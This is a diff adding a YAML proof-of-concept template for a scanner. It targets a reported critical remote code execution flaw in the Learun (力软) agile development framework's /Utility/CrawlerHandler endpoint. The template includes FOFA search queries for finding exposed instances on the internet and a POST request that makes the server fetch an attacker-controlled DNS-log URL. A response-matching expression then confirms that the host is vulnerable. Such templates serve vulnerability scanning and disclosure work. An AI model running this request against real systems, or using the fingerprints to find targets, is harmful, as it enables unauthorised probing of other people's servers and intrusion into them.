@@ -1,0 +1,21 @@
+id: poc-yaml-learun-adf-crawlerhandler-rce
+info:
+  name: 力软敏捷开发框架 CrawlerHandler 远程代码执行漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  finger: 力软敏捷开发框架
+  fofa: body="Home/AccordionIndex" || body="上海力软信息技术有限公司版权所有" || body="/Content/images/Login/psw1.png"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /Utility/CrawlerHandler
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: source[]=http://{{.domain}}
+  expression: status_code == 200 && reverse.Verify() && contains(body,"远程服务器返回错误")
+    && contains(body,"data") && !contains(body,"<")
+transport: http
